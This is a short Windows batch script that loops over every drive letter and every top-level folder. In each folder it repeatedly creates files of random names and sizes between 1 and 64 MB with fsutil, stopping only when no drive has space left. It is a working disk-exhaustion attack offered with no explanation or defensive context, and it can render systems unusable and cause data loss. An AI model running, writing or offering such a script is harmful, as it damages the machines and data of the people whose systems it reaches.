@echo off

setlocal enabledelayedexpansion

:loop
set "noSpaceOnAnyDrive=true"

for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist "%%d:\" (
        for /d %%f in ("%%d:\*") do (
            set "drive=%%f"
            set "randomName="
            for /l %%a in (1,1,12) do (
                set /a "rand=!random! %% 10"
                set "randomName=!randomName!!rand!"
            )
            set /a "size=!random! %% 64 + 1"
            set /a "size=size * 1024 * 1024"
            pushd "!drive!"
            fsutil file createnew "B_B_Q_!randomName!" !size! >nul
            if !errorlevel! equ 0 (
                set "noSpaceOnAnyDrive=false"
            )
            popd
        )
    )
)

if !noSpaceOnAnyDrive!==true (
    goto exit
)

goto loop

:exit
